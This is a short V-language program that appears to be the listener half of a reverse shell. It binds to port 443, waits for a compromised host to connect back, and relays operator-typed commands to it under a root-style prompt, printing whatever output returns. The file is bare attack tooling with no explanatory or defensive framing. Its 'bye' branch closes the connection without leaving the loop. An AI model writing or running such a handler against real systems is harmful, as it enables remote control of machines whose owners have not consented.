import net
import os

fn main() {
	
    mut recvdcmd := []byte{len: 3072}
    listen_on_port := "0.0.0.0:443"
	println("Not Yet Connected ...")
	mut listner := net.listen_tcp(.ip,listen_on_port) or {
		panic(err)
	}
	defer {
		listner.close() or {}
	}
	mut conn := listner.accept() or  {
		panic(err)
	}
	for {
		print("[♥]#: ")
		reader := os.input("")
		command:= reader
		if command == "bye" {
			conn.write_string(command) or {
                panic(err)
            }
			conn.close() or {
                panic(err)
            }			
		} else {
			conn.write_string(command) or {
                panic(err)
            }
			nbytes := conn.read(mut recvdcmd) or {
                panic(err)
            }
			mut result := recvdcmd[0..nbytes].bytestr()

			println(result)

		}

	}

}